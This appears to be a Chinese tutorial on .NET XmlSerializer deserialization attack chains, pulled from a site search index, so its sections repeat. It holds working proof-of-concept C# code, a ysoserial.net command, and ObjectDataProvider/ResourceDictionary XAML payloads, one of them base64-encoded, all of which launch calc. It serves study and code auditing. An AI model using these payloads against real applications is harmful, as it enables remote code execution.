XmlSerializer(Type.GetType(\"ConsoleAppi1.Person\")); xmlSerializer.Serialize(fstream,p1); fstream.Position = 0; Person p1des =(Person) xmlSerializer.Deserialize(fstream); Console.WriteLine(p1des.name); } } \u53cd\u5e8f\u5217\u5316\u540e\u6210\u529f\u8f93\u51fa \u8fd9\u662f\u5e8f\u5217\u5316\u540e\u7684\u5185\u5bb9 \u540c\u65f6\u6211\u4eec\u5728\u4e0a\u9762\u7684\u4ee3\u7801\u4e2d\u53ef\u4ee5\u770b\u5230\u5728\u5b9e\u4f8b\u5316XmlSerializer \u65f6\uff0c\u5728\u4f20\u5165\u7684\u53c2\u6570\u4e2d\u6211\u4eec\u7528\u5230\u4e86Type.GetType\u65b9\u6cd5\u53bb\u83b7\u53d6\u9700\u8981\u88ab\u5e8f\u5217\u5316/\u53cd\u5e8f\u5217\u5316\u7684\u7c7b\u7684type\u3002 \u9664\u4e86\u7528Type.GetType\u5916\uff0c\u5728\u6ce8\u91ca\u7684\u51e0\u884c\u91cc\u6211\u4eec\u8fd8\u53ef\u4ee5\u53d1\u73b0\uff0c\u53ef\u4ee5\u7528 typeof(ClassName) \u548c Object.GetType() \u53bb\u83b7\u53d6\u3002 \u653b\u51fb\u94fe ObjectDataProvider \u8981\u6253\u9020\u56f4\u7ed5XmlSerializer \u7684\u653b\u51fb\u94fe\uff0c\u6211\u4eec\u9700\u8981\u5148\u4e86\u89e3\u4e00\u4e0bObjectDataProvider\u8fd9\u4e2a\u7c7b\uff0c\u8fd9\u4e2a\u7c7b\u53ef\u4ee5\u5e2e\u52a9\u6211\u4eec\u8fdb\u884c\u547d\u4ee4\u6267\u884c\u7b49\u64cd\u4f5c\u3002 \u8fd9\u4e2a\u7c7b\u4f4d\u4e8eSystem.Windows.Data\u4e0b\uff08\u5982\u679crider\u63d0\u793a\u627e\u4e0d\u5230\u5305\uff0c\u5c31\u6dfb\u52a0PresentationFramework\u4f9d\u8d56\uff0c\u6ce8\u610f\u6211\u5f53\u524d\u7684\u73af\u5883\u662f.NET FrameWork\uff09\u3002 \u524d\u7f6e\u77e5\u8bc6\uff1a\u5728.net\u4e2d\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u65b9\u6cd5System.Diagnostics.Process.start()\u6765\u6267\u884c\u547d\u4ee4\uff0c\u5c31\u50cfjava\u91cc\u7684 Runtime.getRuntime.exec() \u4e00\u6837\u3002 ObjectDataProvider o = new ObjectDataProvider(); o.MethodParameters.Add(\"calc\"); o.MethodName = \"Start\"; o.ObjectInstance = new System.Diagnostics.Process(); \u8fd9\u6bb5\u4ee3\u7801\u6267\u884c\u540e\u540e\u5728\u5185\u90e8\u8c03\u7528System.Diagnostics.Process.start\u5f39\u8ba1\u7b97\u5668\u51fa\u6765\u3002 ObjectInstance\u7528\u4e8e\u6307\u5b9a\u5bf9\u8c61\uff0cMethodName\u7528\u4e8e\u6307\u5b9a\u8981\u88ab\u8c03\u7528\u7684\u65b9\u6cd5\uff0cMethodParameters\u6307\u5b9a\u88ab\u8c03\u7528\u65b9\u6cd5\u7684\u53c2\u6570\uff0c\u53c2\u6570\u7528Add\u6dfb\u52a0\u3002 \u540c\u65f6\u8fd9\u6bb5\u4ee3\u7801\u5728\u901a\u8fc7xmlserializer\u53cd\u5e8f\u5217\u5316\u65f6\u4f9d\u65e7\u80fd\u591f\u8d77\u5230\u547d\u4ee4\u6267\u884c\u7684\u4f5c\u7528\uff0c\u4f46\u662f\u76f4\u63a5\u53cd\u5e8f\u5217\u5316\u4f1a\u9047\u5230\u4e00\u4e9b\u95ee\u9898 using System; using System.IO; using System.Windows.Data; using System.Xml.Serialization; namespace ConsoleApplication1 { [XmlRoot] public class evil { public void evilfunc(string c) { System.Diagnostics.Process.Start(c); } } class Program { public static void Main(string[] args) { ObjectDataProvider op = new ObjectDataProvider(); op.ObjectInstance = new evil(); op.MethodName = \"evilfunc\"; op.MethodParameters.Add(\"calc\"); FileStream fileStream = new FileStream(\"E:/tools/dotnet/hellowold/Solution1/ser.bin\", FileMode.OpenOrCreate, FileAccess.ReadWrite, FileShare.ReadWrite); XmlSerializer xmlSerializer = new XmlSerializer(typeof(ObjectDataProvider)); xmlSerializer.Serialize(fileStream,op); } } } \u76f4\u63a5\u53cd\u5e8f\u5217\u5316\u4f1a\u62a5\u4e0b\u9762\u7684\u9519\u3002\u56e0\u4e3a\u6211\u4eec\u5f80XmlSerializer \u4f20\u5165\u7684type\u662fObjectDataProvider\uff0c\u4f46\u662f\u5b9e\u9645\u4e0a\u6211\u4eec\u7684ObjectDataProvider\u4e2d\u6709\u542b\u6709evil\u7c7b\uff0c\u5c31\u4f1a\u5bfc\u81f4\u7c7b\u578b\u9519\u8bef\u3002 \u89e3\u51b3\u65b9\u6848\u662f\u7528ExpandedWrapper\u8fdb\u884c\u5305\u88c5\uff08\u5982\u679c\u627e\u4e0d\u5230\u8fd9\u4e2a\u7c7b\uff0crider\u91cc\u53f3\u952eDependencies\u2192add References\u2192 System.Data.Services) \u5c31\u50cf\u8fd9\u6837 ExpandedWrapper\u672c\u8d28\u4e0a\u662f\u4e00\u4e2a\u6cdb\u578b\u7c7b\uff0c\u53ef\u4ee5\u5c01\u88c5\u975e\u7279\u5b9a\u6570\u636e\u7c7b\u578b\u7684\u5bf9\u8c61\u3002 using System; using System.IO; using System.Windows.Data; using System.Xml.Serialization; using System.Data.Services.Internal; namespace ConsoleApplication1 { [XmlRoot] public class evil { public void evilfunc(string c) { System.Diagnostics.Process.Start(c); } } class Program { public static void Main(string[] args) { ExpandedWrapper<evil, ObjectDataProvider> ew = new ExpandedWrapper<evil, ObjectDataProvider>(); ew.ProjectedProperty0 = new ObjectDataProvider(); ew.ProjectedProperty0.ObjectInstance = new evil(); ew.ProjectedProperty0.MethodName = \"evilfunc\"; ew.ProjectedProperty0.MethodParameters.Add(\"calc\"); FileStream fileStream = new FileStream(\"E:/tools/dotnet/hellowold/Solution1/ser.bin\", FileMode.OpenOrCreate, FileAccess.ReadWrite, FileShare.ReadWrite); XmlSerializer xmlSerializer = new XmlSerializer(typeof(ExpandedWrapper<evil, ObjectDataProvider>)); xmlSerializer.Serialize(fileStream,ew); fileStream.Position = 0; xmlSerializer.Deserialize(fileStream); } } } \u53cd\u5e8f\u5217\u5316\u540e\u6210\u529f\u5f39\u51fa\u8ba1\u7b97\u5668\u3002 ResourceDictionary \u6211\u4eec\u5728\u4e0a\u4e00\u5c0f\u8282\u8bb2\u4e86ObjectDataProvider\u5e76\u5199\u4e86\u4e00\u4e2a\u5c0fdemo\uff0c\u4f46\u662f\u4ec5\u4ec5\u662f\u90a3\u6837\u7684\u8bdd\uff0c\u5a01\u80c1\u8fd8\u4e0d\u591f\u5927\uff0c\u6211\u4eec\u9700\u8981\u627e\u5230\u4e00\u4e2a\u73b0\u5b58\u7684\u6076\u610f\u7c7b\uff0c\u5e76\u4e14\u8fd8\u8981\u63a7\u5236\u53cd\u5e8f\u5217\u5316\u7684\u5185\u5bb9\uff0c\u4ee5\u53ca\u5b9e\u4f8b\u5316XmlSerializer\u65f6\u4f20\u5165\u7684\u53c2\u6570\u624d\u6709\u53ef\u80fd\u5b8c\u6210\u653b\u51fb\u3002 \u6211\u4eec\u53ef\u4ee5\u7528ysoserial.net\u6765\u751f\u6210\u4e00\u6bb5XmlSerializer\u53cd\u5e8f\u5217\u5316\u7684payload https://github.com/pwntester/ysoserial.net/releases/tag/v1.34 .\\ysoserial.exe -g objectdataprovider -c calc -f xmlserializer <?xml version=\"1.0\"?> <root type=\"System.Data.Services.Internal.ExpandedWrapper`2[[System.Windows.Markup.XamlReader, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35],[System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]], System.Data.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089\"> <ExpandedWrapperOfXamlReaderObjectDataProvider xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" > <ExpandedElement/> <ProjectedProperty0> <MethodName>Parse</MethodName> <MethodParameters> <anyType xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xsi:type=\"xsd:string\"> <![CDATA[<ResourceDictionary xmlns=\"http://schemas.microsoft.com/winfx/2006/xaml/presentation\" xmlns:d=\"http://schemas.microsoft.com/winfx/2006/xaml\" xmlns:b=\"clr-namespace:System;assembly=mscorlib\" xmlns:c=\"clr-namespace:System.Diagnostics;assembly=system\"><ObjectDataProvider d:Key=\"\" ObjectType=\"{d:Type c:Process}\" MethodName=\"Start\"><ObjectDataProvider.MethodParameters><b:String>cmd</b:String><b:String>/c calc</b:String></ObjectDataProvider.MethodParameters></ObjectDataProvider></ResourceDictionary>]]> </anyType> </MethodParameters> <ObjectInstance xsi:type=\"XamlReader\"></ObjectInstance> </ProjectedProperty0> </ExpandedWrapperOfXamlReaderObjectDataProvider> </root> \u4f46\u662f\u5b83\u751f\u6210\u7684payload\u5bf9\u4e8e\u65b0\u624b\u5206\u6790\u8d77\u6765\u96be\u514d\u6709\u70b9\u607c\u706b\uff0c\u6240\u4ee5\u6211\u53c2\u8003\u4e86Y4er\u63d0\u4f9b\u7684payload <ResourceDictionary xmlns=\"http://schemas.microsoft.com/winfx/2006/xaml/presentation\" xmlns:d=\"http://schemas.microsoft.com/winfx/2006/xaml\" xmlns:b=\"clr-namespace:System;assembly=mscorlib\" xmlns:c=\"clr-namespace:System.Diagnostics;assembly=system\"> <ObjectDataProvider d:Key=\"\" ObjectType=\"{d:Type c:Process}\" MethodName=\"Start\"> <ObjectDataProvider.MethodParameters> <b:String>cmd</b:String> <b:String>/c calc</b:String> </ObjectDataProvider.MethodParameters> </ObjectDataProvider> </ResourceDictionary> \u8fd9\u6bb5payload\u5b9e\u9645\u4e0a\u662fxaml\uff08\u53ef\u4ee5\u7406\u89e3\u4e3a\u548cxml\u76f8\u8fd1\u7684\u8bed\u8a00\uff09\uff0c\u89e3\u8bfb\u5982\u4e0b\uff1a xmlns:c \u5f15\u7528\u4e86System.Diagnostics\u547d\u540d\u7a7a\u95f4\u8d77\u522b\u540d\u4e3ac d:Key=\"\" \u8d77\u522b\u540d\u4e3a\u7a7a\uff0c\u5728xaml\u8bed\u6cd5\u4e2d\uff0cKey\u8fd9\u4e2a\u952e\u503c\u5fc5\u987b\u6709\u3002 ObjectType\u8868\u793a\u5bf9\u8c61\u7c7b\u578b d:Type \u7b49\u540c\u4e8etypeof()\uff0c\u90a3\u4e48 d:Type c:Process \u5c31\u76f8\u5f53\u4e8e typeof(System.Diagnostics.Process) MethodName\u662fObjectDataProvider\u7684\u5c5e\u6027\uff0c\u4f20\u9012\u4e00\u4e2aStart\u7b49\u4e8e\u8c03\u7528Start\u65b9\u6cd5\u3002 \u5982\u679c\u8fd9\u6bb5xaml\u88ab\u89e3\u6790\uff0c\u90a3\u4e48\u5c31\u76f8\u5f53\u4e8e\u521b\u5efa\u4e86\u4e00\u4e2aObjectDataProvider \u5bf9\u8c61\u53bb\u6267\u884cSystem.Diagnostics.Process.start(\"calc\") \u90a3\u4e48\u5982\u4f55\u88ab\u89e3\u6790\u5462\uff1f \u7f51\u4e0a\u5927\u81f4\u6709\u4e24\u79cd\u601d\u8def 1.\u5b9e\u4f8b\u5316XmlSerializer\u65f6\u4f20\u5165\u7684type\u53ef\u63a7\uff0c\u4e14XmlSerializer.Deserialize\u7684\u53c2\u6570\u53ef\u63a7\uff0c\u4f46\u662f\u7531\u4e8eDeserialize\u65b9\u6cd5\u5e76\u4e0d\u80fd\u63a5\u6536string\u53c2\u6570\uff0c\u6240\u4ee5\u8bf4\u8fd9\u4e2a\u601d\u8def\u53ef\u80fd\u66f4\u52a0\u9002\u5408\u901a\u8fc7\u4ee3\u7801\u5ba1\u8ba1\u53d1\u73b0\u4e00\u4e9b\u65b0\u7684\u94fe\uff08\u8fd9\u6837\u7684\u8bdd\u5c31\u6ca1\u5fc5\u8981\u7528\u5230ResourceDictionary\u4e86\uff09 2.\u4f7f\u7528XamlReader.Parse \uff0c\u8fd9\u4e2a\u65b9\u6cd5\u53ef\u4ee5\u76f4\u63a5\u4f20\u5165string\u53c2\u6570 \u4e0b\u9762\u7528XamlReader.Parse\u89e3\u6790\u4e00\u4e0b\u4e0a\u9762\u7684xaml string p = \"PFJlc291cmNlRGljdGlvbmFyeSAKICAgICAgICAgICAgICAgICAgICB4bWxucz0iaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS93aW5meC8yMDA2L3hhbWwvcHJlc2VudGF0aW9uIiAKICAgICAgICAgICAgICAgICAgICB4bWxuczpkPSJodHRwOi8vc2NoZW1hcy5taWNyb3NvZnQuY29tL3dpbmZ4LzIwMDYveGFtbCIgCiAgICAgICAgICAgICAgICAgICAgeG1sbnM6Yj0iY2xyLW5hbWVzcGFjZTpTeXN0ZW07YXNzZW1ibHk9bXNjb3JsaWIiIAogICAgICAgICAgICAgICAgICAgIHhtbG5zOmM9ImNsci1uYW1lc3BhY2U6U3lzdGVtLkRpYWdub3N0aWNzO2Fzc2VtYmx5PXN5c3RlbSI+CiAgICA8T2JqZWN0RGF0YVByb3ZpZGVyIGQ6S2V5PSIiIE9iamVjdFR5cGU9IntkOlR5cGUgYzpQcm9jZXNzfSIgTWV0aG9kTmFtZT0iU3RhcnQiPgogICAgICAgIDxPYmplY3REYXRhUHJvdmlkZXIuTWV0aG9kUGFyYW1ldGVycz4KICAgICAgICAgICAgPGI6U3RyaW5nPmNtZDwvYjpTdHJpbmc+CiAgICAgICAgICAgIDxiOlN0cmluZz4vYyBjYWxjPC9iOlN0cmluZz4KICAgICAgICA8L09iamVjdERhdGFQcm92aWRlci5NZXRob2RQYXJhbWV0ZXJzPgogICAgPC9PYmplY3REYXRhUHJvdmlkZXI+CjwvUmVzb3VyY2VEaWN0aW9uYXJ5Pg==\"; byte[] vs = Convert.FromBase64String(p); string xml = Encoding.UTF8.GetString(vs); XamlReader.Parse(xml); Ref: https://github.com/Y4er/dotnet-deserialization/blob/main/XmlSerializer.md https://www.anquanke.com/post/id/172316#h3-8 https://blog.51cto.com/u_13953961/3106574","title":"\u57fa\u7840\u94fe-XmlSerializer\u94fe"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Dotnet/%E5%9F%BA%E7%A1%80%E9%93%BE-XmlSerializer%E9%93%BE/%E5%9F%BA%E7%A1%80%E9%93%BE-XmlSerializer%E9%93%BE/#-xmlserializer","text":"","title":"\u57fa\u7840\u94fe-XmlSerializer\u94fe"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Dotnet/%E5%9F%BA%E7%A1%80%E9%93%BE-XmlSerializer%E9%93%BE/%E5%9F%BA%E7%A1%80%E9%93%BE-XmlSerializer%E9%93%BE/#_1","text":"XmlSerializer\u5e8f\u5217\u5316/\u53cd\u5e8f\u5217\u5316 \u653b\u51fb\u94fe ObjectDataProvider ResourceDictionary Ref:","title":"\u76ee\u5f55"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Dotnet/%E5%9F%BA%E7%A1%80%E9%93%BE-XmlSerializer%E9%93%BE/%E5%9F%BA%E7%A1%80%E9%93%BE-XmlSerializer%E9%93%BE/#xmlserializer","text":"\u6765\u4e2ademo \u6211\u4eec\u628a\u8981\u5e8f\u5217\u5316\u7684\u7c7b\u7528[XmlRoot]\uff0c[XmlAttribute]\uff0c[XmlElement]\u7279\u6027\u5206\u522b\u6307\u5b9a\u6839\u8282\u70b9\uff0c\u8282\u70b9\u5c5e\u6027\uff0c\u8282\u70b9\u5143\u7d20\u3002 \u7136\u540e\u7528XmlSerializer \u8fdb\u884c\u5e8f\u5217\u5316\u548c\u53cd\u5e8f\u5217\u5316 using System; using System.Runtime.Serialization; using System.Runtime.Serialization.Formatters.Binary; using System.Security.Permissions; using System.Xml.Serialization; namespace ConsoleAppi1; [XmlRoot] public class Person { [XmlAttribute] public string name { get; set; } [XmlElement] public int age { get; set; } [XmlElement] public string sex { get; set; } } public class MyObject { static void Main(string[] args) { Person p1 = new Person(); p1.age = 20; p1.name = \"tom\"; p1.sex = \"male\"; FileStream fstream = new FileStream(\"E:/tools/dotnet/hellowold/Solution1/ser.bin\", FileMode.OpenOrCreate, FileAccess.ReadWrite, FileShare.ReadWrite); //XmlSerializer xmlSerializer = new XmlSerializer(typeof(Person)); //XmlSerializer xmlSerializer = new XmlSerializer(p1.GetType()); XmlSerializer xmlSerializer = new XmlSerializer(Type.GetType(\"ConsoleAppi1.Person\")); xmlSerializer.Serialize(fstream,p1); fstream.Position = 0; Person p1des =(Person) xmlSerializer.Deserialize(fstream); Console.WriteLine(p1des.name); } } \u53cd\u5e8f\u5217\u5316\u540e\u6210\u529f\u8f93\u51fa \u8fd9\u662f\u5e8f\u5217\u5316\u540e\u7684\u5185\u5bb9 \u540c\u65f6\u6211\u4eec\u5728\u4e0a\u9762\u7684\u4ee3\u7801\u4e2d\u53ef\u4ee5\u770b\u5230\u5728\u5b9e\u4f8b\u5316XmlSerializer \u65f6\uff0c\u5728\u4f20\u5165\u7684\u53c2\u6570\u4e2d\u6211\u4eec\u7528\u5230\u4e86Type.GetType\u65b9\u6cd5\u53bb\u83b7\u53d6\u9700\u8981\u88ab\u5e8f\u5217\u5316/\u53cd\u5e8f\u5217\u5316\u7684\u7c7b\u7684type\u3002 \u9664\u4e86\u7528Type.GetType\u5916\uff0c\u5728\u6ce8\u91ca\u7684\u51e0\u884c\u91cc\u6211\u4eec\u8fd8\u53ef\u4ee5\u53d1\u73b0\uff0c\u53ef\u4ee5\u7528 typeof(ClassName) \u548c Object.GetType() \u53bb\u83b7\u53d6\u3002","title":"XmlSerializer\u5e8f\u5217\u5316/\u53cd\u5e8f\u5217\u5316"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Dotnet/%E5%9F%BA%E7%A1%80%E9%93%BE-XmlSerializer%E9%93%BE/%E5%9F%BA%E7%A1%80%E9%93%BE-XmlSerializer%E9%93%BE/#_2","text":"","title":"\u653b\u51fb\u94fe"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Dotnet/%E5%9F%BA%E7%A1%80%E9%93%BE-XmlSerializer%E9%93%BE/%E5%9F%BA%E7%A1%80%E9%93%BE-XmlSerializer%E9%93%BE/#objectdataprovider","text":"\u8981\u6253\u9020\u56f4\u7ed5XmlSerializer \u7684\u653b\u51fb\u94fe\uff0c\u6211\u4eec\u9700\u8981\u5148\u4e86\u89e3\u4e00\u4e0bObjectDataProvider\u8fd9\u4e2a\u7c7b\uff0c\u8fd9\u4e2a\u7c7b\u53ef\u4ee5\u5e2e\u52a9\u6211\u4eec\u8fdb\u884c\u547d\u4ee4\u6267\u884c\u7b49\u64cd\u4f5c\u3002 \u8fd9\u4e2a\u7c7b\u4f4d\u4e8eSystem.Windows.Data\u4e0b\uff08\u5982\u679crider\u63d0\u793a\u627e\u4e0d\u5230\u5305\uff0c\u5c31\u6dfb\u52a0PresentationFramework\u4f9d\u8d56\uff0c\u6ce8\u610f\u6211\u5f53\u524d\u7684\u73af\u5883\u662f.NET FrameWork\uff09\u3002 \u524d\u7f6e\u77e5\u8bc6\uff1a\u5728.net\u4e2d\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u65b9\u6cd5System.Diagnostics.Process.start()\u6765\u6267\u884c\u547d\u4ee4\uff0c\u5c31\u50cfjava\u91cc\u7684 Runtime.getRuntime.exec() \u4e00\u6837\u3002 ObjectDataProvider o = new ObjectDataProvider(); o.MethodParameters.Add(\"calc\"); o.MethodName = \"Start\"; o.ObjectInstance = new System.Diagnostics.Process(); \u8fd9\u6bb5\u4ee3\u7801\u6267\u884c\u540e\u540e\u5728\u5185\u90e8\u8c03\u7528System.Diagnostics.Process.start\u5f39\u8ba1\u7b97\u5668\u51fa\u6765\u3002 ObjectInstance\u7528\u4e8e\u6307\u5b9a\u5bf9\u8c61\uff0cMethodName\u7528\u4e8e\u6307\u5b9a\u8981\u88ab\u8c03\u7528\u7684\u65b9\u6cd5\uff0cMethodParameters\u6307\u5b9a\u88ab\u8c03\u7528\u65b9\u6cd5\u7684\u53c2\u6570\uff0c\u53c2\u6570\u7528Add\u6dfb\u52a0\u3002 \u540c\u65f6\u8fd9\u6bb5\u4ee3\u7801\u5728\u901a\u8fc7xmlserializer\u53cd\u5e8f\u5217\u5316\u65f6\u4f9d\u65e7\u80fd\u591f\u8d77\u5230\u547d\u4ee4\u6267\u884c\u7684\u4f5c\u7528\uff0c\u4f46\u662f\u76f4\u63a5\u53cd\u5e8f\u5217\u5316\u4f1a\u9047\u5230\u4e00\u4e9b\u95ee\u9898 using System; using System.IO; using System.Windows.Data; using System.Xml.Serialization; namespace ConsoleApplication1 { [XmlRoot] public class evil { public void evilfunc(string c) { System.Diagnostics.Process.Start(c); } } class Program { public static void Main(string[] args) { ObjectDataProvider op = new ObjectDataProvider(); op.ObjectInstance = new evil(); op.MethodName = \"evilfunc\"; op.MethodParameters.Add(\"calc\"); FileStream fileStream = new FileStream(\"E:/tools/dotnet/hellowold/Solution1/ser.bin\", FileMode.OpenOrCreate, FileAccess.ReadWrite, FileShare.ReadWrite); XmlSerializer xmlSerializer = new XmlSerializer(typeof(ObjectDataProvider)); xmlSerializer.Serialize(fileStream,op); } } } \u76f4\u63a5\u53cd\u5e8f\u5217\u5316\u4f1a\u62a5\u4e0b\u9762\u7684\u9519\u3002\u56e0\u4e3a\u6211\u4eec\u5f80XmlSerializer \u4f20\u5165\u7684type\u662fObjectDataProvider\uff0c\u4f46\u662f\u5b9e\u9645\u4e0a\u6211\u4eec\u7684ObjectDataProvider\u4e2d\u6709\u542b\u6709evil\u7c7b\uff0c\u5c31\u4f1a\u5bfc\u81f4\u7c7b\u578b\u9519\u8bef\u3002 \u89e3\u51b3\u65b9\u6848\u662f\u7528ExpandedWrapper\u8fdb\u884c\u5305\u88c5\uff08\u5982\u679c\u627e\u4e0d\u5230\u8fd9\u4e2a\u7c7b\uff0crider\u91cc\u53f3\u952eDependencies\u2192add References\u2192 System.Data.Services) \u5c31\u50cf\u8fd9\u6837 ExpandedWrapper\u672c\u8d28\u4e0a\u662f\u4e00\u4e2a\u6cdb\u578b\u7c7b\uff0c\u53ef\u4ee5\u5c01\u88c5\u975e\u7279\u5b9a\u6570\u636e\u7c7b\u578b\u7684\u5bf9\u8c61\u3002 using System; using System.IO; using System.Windows.Data; using System.Xml.Serialization; using System.Data.Services.Internal; namespace ConsoleApplication1 { [XmlRoot] public class evil { public void evilfunc(string c) { System.Diagnostics.Process.Start(c); } } class Program { public static void Main(string[] args) { ExpandedWrapper<evil, ObjectDataProvider> ew = new ExpandedWrapper<evil, ObjectDataProvider>(); ew.ProjectedProperty0 = new ObjectDataProvider(); ew.ProjectedProperty0.ObjectInstance = new evil(); ew.ProjectedProperty0.MethodName = \"evilfunc\"; ew.ProjectedProperty0.MethodParameters.Add(\"calc\"); FileStream fileStream = new FileStream(\"E:/tools/dotnet/hellowold/Solution1/ser.bin\", FileMode.OpenOrCreate, FileAccess.ReadWrite, FileShare.ReadWrite); XmlSerializer xmlSerializer = new XmlSerializer(typeof(ExpandedWrapper<evil, ObjectDataProvider>)); xmlSerializer.Serialize(fileStream,ew); fileStream.Position = 0; xmlSerializer.Deserialize(fileStream); } } } \u53cd\u5e8f\u5217\u5316\u540e\u6210\u529f\u5f39\u51fa\u8ba1\u7b97\u5668\u3002","title":"ObjectDataProvider"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Dotnet/%E5%9F%BA%E7%A1%80%E9%93%BE-XmlSerializer%E9%93%BE/%E5%9F%BA%E7%A1%80%E9%93%BE-XmlSerializer%E9%93%BE/#resourcedictionary","text":"\u6211\u4eec\u5728\u4e0a\u4e00\u5c0f\u8282\u8bb2\u4e86ObjectDataProvider\u5e76\u5199\u4e86\u4e00\u4e2a\u5c0fdemo\uff0c\u4f46\u662f\u4ec5\u4ec5\u662f\u90a3\u6837\u7684\u8bdd\uff0c\u5a01\u80c1\u8fd8\u4e0d\u591f\u5927\uff0c\u6211\u4eec\u9700\u8981\u627e\u5230\u4e00\u4e2a\u73b0\u5b58\u7684\u6076\u610f\u7c7b\uff0c\u5e76\u4e14\u8fd8\u8981\u63a7\u5236\u53cd\u5e8f\u5217\u5316\u7684\u5185\u5bb9\uff0c\u4ee5\u53ca\u5b9e\u4f8b\u5316XmlSerializer\u65f6\u4f20\u5165\u7684\u53c2\u6570\u624d\u6709\u53ef\u80fd\u5b8c\u6210\u653b\u51fb\u3002 \u6211\u4eec\u53ef\u4ee5\u7528ysoserial.net\u6765\u751f\u6210\u4e00\u6bb5XmlSerializer\u53cd\u5e8f\u5217\u5316\u7684payload https://github.com/pwntester/ysoserial.net/releases/tag/v1.34 .\\ysoserial.exe -g objectdataprovider -c calc -f xmlserializer <?xml version=\"1.0\"?> <root type=\"System.Data.Services.Internal.ExpandedWrapper`2[[System.Windows.Markup.XamlReader, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35],[System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]], System.Data.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089\"> <ExpandedWrapperOfXamlReaderObjectDataProvider xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" > <ExpandedElement/> <ProjectedProperty0> <MethodName>Parse</MethodName> <MethodParameters> <anyType xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xsi:type=\"xsd:string\"> <![CDATA[<ResourceDictionary xmlns=\"http://schemas.microsoft.com/winfx/2006/xaml/presentation\" xmlns:d=\"http://schemas.microsoft.com/winfx/2006/xaml\" xmlns:b=\"clr-namespace:System;assembly=mscorlib\" xmlns:c=\"clr-namespace:System.Diagnostics;assembly=system\"><ObjectDataProvider d:Key=\"\" ObjectType=\"{d:Type c:Process}\" MethodName=\"Start\"><ObjectDataProvider.MethodParameters><b:String>cmd</b:String><b:String>/c calc</b:String></ObjectDataProvider.MethodParameters></ObjectDataProvider></ResourceDictionary>]]> </anyType> </MethodParameters> <ObjectInstance xsi:type=\"XamlReader\"></ObjectInstance> </ProjectedProperty0> </ExpandedWrapperOfXamlReaderObjectDataProvider> </root> \u4f46\u662f\u5b83\u751f\u6210\u7684payload\u5bf9\u4e8e\u65b0\u624b\u5206\u6790\u8d77\u6765\u96be\u514d\u6709\u70b9\u607c\u706b\uff0c\u6240\u4ee5\u6211\u53c2\u8003\u4e86Y4er\u63d0\u4f9b\u7684payload <ResourceDictionary xmlns=\"http://schemas.microsoft.com/winfx/2006/xaml/presentation\" xmlns:d=\"http://schemas.microsoft.com/winfx/2006/xaml\" xmlns:b=\"clr-namespace:System;assembly=mscorlib\" xmlns:c=\"clr-namespace:System.Diagnostics;assembly=system\"> <ObjectDataProvider d:Key=\"\" ObjectType=\"{d:Type c:Process}\" MethodName=\"Start\"> <ObjectDataProvider.MethodParameters> <b:String>cmd</b:String> <b:String>/c calc</b:String> </ObjectDataProvider.MethodParameters> </ObjectDataProvider> </ResourceDictionary> \u8fd9\u6bb5payload\u5b9e\u9645\u4e0a\u662fxaml\uff08\u53ef\u4ee5\u7406\u89e3\u4e3a\u548cxml\u76f8\u8fd1\u7684\u8bed\u8a00\uff09\uff0c\u89e3\u8bfb\u5982\u4e0b\uff1a xmlns:c \u5f15\u7528\u4e86System.Diagnostics\u547d\u540d\u7a7a\u95f4\u8d77\u522b\u540d\u4e3ac d:Key=\"\" \u8d77\u522b\u540d\u4e3a\u7a7a\uff0c\u5728xaml\u8bed\u6cd5\u4e2d\uff0cKey\u8fd9\u4e2a\u952e\u503c\u5fc5\u987b\u6709\u3002 ObjectType\u8868\u793a\u5bf9\u8c61\u7c7b\u578b d:Type \u7b49\u540c\u4e8etypeof()\uff0c\u90a3\u4e48 d:Type c:Process \u5c31\u76f8\u5f53\u4e8e typeof(System.Diagnostics.Process) MethodName\u662fObjectDataProvider\u7684\u5c5e\u6027\uff0c\u4f20\u9012\u4e00\u4e2aStart\u7b49\u4e8e\u8c03\u7528Start\u65b9\u6cd5\u3002 \u5982\u679c\u8fd9\u6bb5xaml\u88ab\u89e3\u6790\uff0c\u90a3\u4e48\u5c31\u76f8\u5f53\u4e8e\u521b\u5efa\u4e86\u4e00\u4e2aObjectDataProvider \u5bf9\u8c61\u53bb\u6267\u884cSystem.Diagnostics.Process.start(\"calc\") \u90a3\u4e48\u5982\u4f55\u88ab\u89e3\u6790\u5462\uff1f \u7f51\u4e0a\u5927\u81f4\u6709\u4e24\u79cd\u601d\u8def 